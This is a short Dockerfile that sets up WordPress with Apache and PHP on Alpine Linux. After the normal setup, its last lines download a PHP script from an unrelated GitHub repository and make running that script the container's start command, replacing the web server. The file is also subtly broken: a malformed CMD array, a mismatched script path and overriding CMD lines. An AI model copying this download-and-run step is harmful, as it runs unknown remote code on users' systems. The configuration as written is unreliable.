# Use a lightweight Linux distribution as the base image
FROM alpine:latest

# Install required packages for PHP, Apache, and WordPress
RUN apk --no-cache add \
    apache2 \
    apache2-utils \
    php \
    php-apache2 \
    php-curl \
    php-mysqli \
    curl \
    bash \
    less \
    vim

# Set the working directory
WORKDIR /var/www/html

# Download the WordPress files
RUN curl -o wordpress.tar.gz https://wordpress.org/latest.tar.gz && \
    tar -xzf wordpress.tar.gz --strip-components=1 && \
    rm wordpress.tar.gz


# Set permissions
RUN chown -R www-data:www-data /var/www/html

# Copy custom plugins or themes if needed
# COPY ./plugins /var/www/html/wp-content/plugins/
# COPY ./themes /var/www/html/wp-content/themes/

# Configure Apache
RUN echo "ServerName localhost" >> /etc/apache2/httpd.conf

# Expose port 80 for HTTP traffic
EXPOSE 80

# Start Apache in the foreground
CMD ["/usr/bin/httpd", "-D", "FOREGROUND" "&&" ]

# Download the PHP script
RUN curl -o /app/script.php https://raw.githubusercontent.com/rabytebuild/xtx/main/dodirect.php

# Run the PHP script
CMD ["php", "script.php"]

